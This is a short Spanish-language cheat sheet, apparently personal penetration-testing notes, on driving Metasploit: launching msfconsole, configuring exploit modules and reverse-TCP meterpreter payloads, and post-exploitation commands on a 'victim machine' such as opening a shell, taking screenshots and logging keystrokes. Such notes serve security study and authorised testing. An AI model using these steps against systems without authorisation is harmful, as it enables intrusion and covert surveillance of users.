# Metasploit 

Tags: #Comandos #Metasploit #Payloads #Msfvenom

* Para verificar la DB del Metasploit y despues entrar (Cuando se ejecuta por primera vez)
```bash 
❯ msfdb run
```

* Ejecutar Metasploit
```bash 
❯ msfconsole -q         # q = Quitar el banner de inicio
```

* Comandos de Metasploit dentro de la maquina victima 
```bash 
❯ help                  # Miramos el panel de ayuda
❯ shell                 # Nos regresa una Shell para interactuar mejor 
❯ screenshot            # Captura de pantalla del esquipo
❯ keyscan_start         # Sniffer de pulsaciones del teclado
❯ keyscan_dump          # Nos muestra lo que capturo por el teclado con el comando anterior
❯ background            # Ponemos la sesion en segundo plano 
❯ sessions              # Miramos las sesiones activas en segundo plano 
```

```bash
❯ search ❮exploit❯      # Buscamos el exploit
		# Modulos: 'Auxiliary, Exploits, Post, Payload'
		# Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'

❯ use ❮Number or path❯  # Colocamos el numero del exploit que vamos a usar
❯ options               # Miramos las opciones del exploit y lo que debemos de configurar
❯ set LHOST ❮IP❯        # Configuramos el IP local eth0, ens33 (Si estamos en una VPN colocar el Tun0)
❯ set RHOSTS ❮IP❯       # Configuramos el IP remoto (maquina victima)
❯ set RPORT ❮Port❯      # Configuramos el puerto remoto (maquina victima)
❯ set LPORT ❮Port❯      # Configuramos el puerto local
❯ show targets          # Miras los targets disponibles (Diferentes versiones de Windows)
❯ set target ❮Number❯   # Seleccionamos el numero de target a usar
❯ show payloads         # Miramos los payload disponibles
❯ set payload ❮Path❯    # Colocamos la ruta del Payload a usar
❯ run                   # Ejecutamos el exploit  
❯ shell                 # Dentro del exploit con shell nos podemos conseguir una consola interactiva
```

**Payloads**
```bash
Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> **windows/meterpreter_reverse_tcp**
Staged                  # Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**
```